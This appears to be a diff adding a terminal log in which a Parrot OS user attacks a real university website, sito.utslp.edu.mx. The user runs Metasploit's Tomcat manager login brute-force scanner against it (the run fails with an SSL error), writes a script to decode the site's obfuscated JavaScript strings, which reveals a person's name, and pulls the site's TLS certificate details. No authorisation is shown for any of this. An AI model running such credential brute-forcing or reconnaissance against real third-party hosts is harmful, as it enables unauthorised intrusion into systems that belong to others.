@@ -1,0 +1,56 @@
+[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/http/tomcat_mgr_login 
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rhosts sito.utslp.edu.mx
+rhosts => sito.utslp.edu.mx
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rport 443
+rport => 443
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set SSL true
+[!] Changing the SSL option's value may require changing RPORT!
+SSL => true
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set SSLversion SSL3
+SSLversion => SSL3
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set targeturi /manager/html
+targeturi => /manager/html
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set stop_on_success true
+stop_on_success => true
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set verbose true
+verbose => true
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
+[*] Error: 189.254.143.102: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=189.254.143.102:443 state=error: no protocols available
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo]
+└──╼ $# Crea un script para decodificar la función 'f'
+cat > decode.js << 'EOF'
+function f(D) {
+    var p = "aRfguQwJvbc#h l)[W2jkm/op?N!rVisGq=@tB3O4CdeF9n0U(HI_6X]KLM>,DE.-Pxyz15YZ<78AST";
+    var l = "gJvbUWc#,Dh5w*sGq=@tB[!39nO4CuYdeF0a]Kl)iQxZ<7yf2jkSTrVm/oR-Pp?NI_6XLM>E.z18A(H";
+    var F = D.split("").reverse();
+    var E = "";
+    for(cont = 0; cont < F.length; cont++) {
+        for(cont2 = 0; cont2 < l.length; cont2++) {
+            if(l[cont2] == F[cont]) {
+                E = E + "" + p[cont2];
+                break;
+            }
+        }
+    }
+    return E;
+}
+
+// Decodifica strings importantes
+console.log("String 1:", f(")HS(*39YUF?"));
+console.log("String 2:", f("gYhCge*3y3H*Zd3#"));
+EOF
+
+node decode.js
+String 1: Equipo SITO
+String 2: Jose Tono Garcia
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo]
+└──╼ $openssl s_client -connect sito.utslp.edu.mx:443 -showcerts < /dev/null 2>/dev/null | openssl x509 -noout -text | grep -i "subject:\|issuer:\|dns"
+        Issuer: C = US, ST = Arizona, L = Scottsdale, O = "Starfield Technologies, Inc.", OU = http://certs.starfieldtech.com/repository/, CN = Starfield Secure Certificate Authority - G2
+        Subject: CN = *.utslp.edu.mx
+                DNS:*.utslp.edu.mx, DNS:utslp.edu.mx
+
+
